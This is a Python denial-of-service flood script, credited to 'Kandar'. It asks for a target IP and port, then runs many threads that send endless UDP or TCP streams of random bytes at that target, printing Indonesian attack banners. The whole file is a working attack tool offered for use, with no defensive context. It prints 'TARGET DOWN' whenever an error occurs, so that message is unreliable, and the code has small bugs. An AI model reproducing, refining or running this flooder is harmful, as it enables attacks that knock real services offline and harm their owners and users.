#Autor : Kandar
#Remake : Kandar
import random
import socket
import threading
import os
import sys
import time

os.system("clear")
print(" \033[92m Remake By : Kandar")
print("\033[0m")
print(""" \033[91m
██╗░░██╗░░██╗██╗███╗░░██╗██████╗░░█████╗░██████╗░
██║░██╔╝░██╔╝██║████╗░██║██╔══██╗██╔══██╗██╔══██╗
█████═╝░██╔╝░██║██╔██╗██║██║░░██║███████║██████╔╝
██╔═██╗░███████║██║╚████║██║░░██║██╔══██║██╔══██╗
██║░╚██╗╚════██║██║░╚███║██████╔╝██║░░██║██║░░██║
╚═╝░░╚═╝░░░░░╚═╝╚═╝░░╚══╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝""")
print("\033[0m")


ip = str(input("====> \033[91m Host/Ip Target:"))
port = int(input(" \033[0m====> \033[91m Port Target:"))
choice = str(input(" \033[0m====> \033[91m Pilih Method | UDP | TCP |:"))
times = int(input(" \033[0m====> \033[91m Paket :"))
threads = int(input("\033[0m====> \033[91m Threads:"))

os.system("clear")
def run():
	data = random._urandom(1025)
	i = random.choice(("\033[93m [@] K4NDAR ====>]","\033[93m [@] K4NDAR ====>]","\033[93m [@] K4NDAR====>]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" \033[91mATTACK IP:\033[0m%s\033[91m MEMBANTAI PORT:\033[0m%s"%(ip,port))
		except:
			print("\033[92m [SUCCESS] TARGET DOWN")

def run2():
	data = random._urandom(16)
	i = random.choice(("\033[93m [@] K4NDAR ====>]","\033[93m [@] K4NDAR ====>]","\033[93m [@] K4NDAR ====>]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91mGATTACK IP:\033[0m%s\033[91m MEMBANTAI PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print("\033[92m [SUCCESS] TARGET DOWN")

def tcp():
    data = random._urandom(1024)
    while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip,port))
                s.send(data)
                for x in range(time):
                    s.send(data)
                print('\033[94m K4NDAR')
            except:
                s.close

for udp in range(threads):
	if choice == 'UDP':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()   
 
for y in range(threads):
  if choice == 'TCP':
    th = threading.Thread(target = tcp)
    th.start() 
   
